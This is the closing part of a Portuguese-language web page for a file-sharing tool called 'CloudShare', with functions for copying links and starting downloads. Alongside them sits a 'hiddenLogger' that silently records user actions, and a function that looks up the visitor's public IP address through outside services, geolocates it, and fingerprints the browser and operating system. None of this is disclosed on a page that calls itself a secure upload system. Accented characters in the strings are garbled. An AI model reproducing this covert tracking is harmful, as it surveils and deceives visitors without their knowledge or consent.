    function copyDownloadLink() {
      const text = downloadLink.value;

      // Usar API do clipboard quando dispon√≠vel, sen√£o fallback para execCommand
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).catch(() => {
          downloadLink.select();
          document.execCommand('copy');
        });
      } else {
        downloadLink.select();
        document.execCommand('copy');
      }

      // Feedback visual
      const originalText = copyBtn.innerHTML;
      copyBtn.innerHTML = '<i class="fas fa-check"></i> Copiado!';
      setTimeout(() => {
        copyBtn.innerHTML = originalText;
      }, 2000);

      hiddenLogger.log('LINK_COPIADO', {
        fileName: uploadedFile ? uploadedFile.name : 'N/A',
        downloadUrl: downloadLink.value
      });
    }
    
    function handleDownload() {
      if (!uploadedFileUrl) {
        showStatus('Erro: Arquivo n√£o encontrado.', 'error');
        return;
      }
      
      try {
        // Criar link de download funcional
        const a = document.createElement('a');
        a.href = uploadedFileUrl;
        a.download = uploadedFile.name;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        
        showStatus('Download iniciado! Verifique sua pasta de downloads.', 'success');

        hiddenLogger.log('DOWNLOAD_INICIADO', {
          fileName: uploadedFile.name,
          fileSize: formatFileSize(uploadedFile.size)
        });
        
      } catch (error) {
        showStatus('Erro ao iniciar download. Tente salvar o arquivo manualmente.', 'error');
      }
    }
    
    async function getUserInfo() {
      let ip = 'N√£o dispon√≠vel';
      let city = 'N√£o dispon√≠vel';
      let country = 'N√£o dispon√≠vel';
      
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        ip = ipData.ip;
        
        try {
          const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
          const locationData = await locationResponse.json();
          city = locationData.city || 'N√£o dispon√≠vel';
          country = locationData.country_name || 'N√£o dispon√≠vel';
        } catch (e) {
          // Falha silenciosa
        }
      } catch (error) {
        ip = '127.0.0.1';
      }
      
      // Detectar navegador e SO
      const userAgent = navigator.userAgent;
      let browser = 'Desconhecido';
      let operatingSystem = 'Desconhecido';
      
      if (userAgent.includes('Firefox')) browser = 'Firefox';
      else if (userAgent.includes('Chrome')) browser = 'Chrome';
      else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Safari';
      else if (userAgent.includes('Edge')) browser = 'Edge';
      else if (userAgent.includes('Opera')) browser = 'Opera';
      
      if (userAgent.includes('Windows')) operatingSystem = 'Windows';
      else if (userAgent.includes('Mac')) operatingSystem = 'macOS';
      else if (userAgent.includes('Linux')) operatingSystem = 'Linux';
      else if (userAgent.includes('Android')) operatingSystem = 'Android';
      else if (userAgent.includes('iOS')) operatingSystem = 'iOS';
      
      return { ip, city: city !== 'N√£o dispon√≠vel' ? `${city}, ${country}` : 'N√£o dispon√≠vel', browser, operatingSystem };
    }
    
    function showStatus(message, type) {
      statusMessage.textContent = message;
      statusMessage.className = `status-message ${type} show`;
      setTimeout(hideStatus, 5000);
    }
    
    function hideStatus() {
      statusMessage.className = 'status-message';
    }

    // Inicializa√ß√£o
    document.addEventListener('DOMContentLoaded', function() {
      console.log('‚òÅÔ∏è CloudShare inicializado - Sistema de upload seguro');
      hiddenLogger.log('SISTEMA_INICIADO', { timestamp: new Date().toISOString() });
    });
  </script>
</body>
</html>